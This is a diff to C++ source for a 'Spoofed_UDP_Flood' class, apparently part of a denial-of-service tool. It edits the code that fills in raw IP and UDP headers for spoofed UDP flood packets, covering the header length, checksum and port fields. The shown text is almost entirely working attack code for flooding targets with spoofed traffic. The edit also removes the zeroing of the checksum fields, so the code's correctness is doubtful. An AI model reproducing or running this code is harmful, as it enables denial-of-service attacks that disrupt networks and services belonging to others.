@@ -94,7 +94,7 @@ void Spoofed_UDP_Flood::override_headers(udphdr *udp, iphdr *ip) {
 void Spoofed_UDP_Flood::init_headers(iphdr *ip, udphdr *udp, char *buf) {
     auto s_port = conf->RandomizePort ? Randomizer::randomPort() : 0;
     // IP Struct
-    ip->ihl = 5;
+    ip->ihl = sizeof(struct iphdr)/4;
     ip->version = 4;
     ip->tos = 16;
     ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(buf);
@@ -102,12 +102,10 @@ void Spoofed_UDP_Flood::init_headers(iphdr *ip, udphdr *udp, char *buf) {
     ip->frag_off = htons(0x0);
     ip->ttl = 255;
     ip->protocol = IPPROTO_UDP;
-    ip->check = 0;
     ip->check = csum((unsigned short *) buf, ip->tot_len);
 
     // UDP Struct
     udp->uh_sport = htons(static_cast<uint16_t>(s_port));
     udp->uh_dport = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
     udp->uh_ulen = htons(static_cast<uint16_t>(sizeof(struct udphdr)));
-    udp->uh_sum = 0;
 }
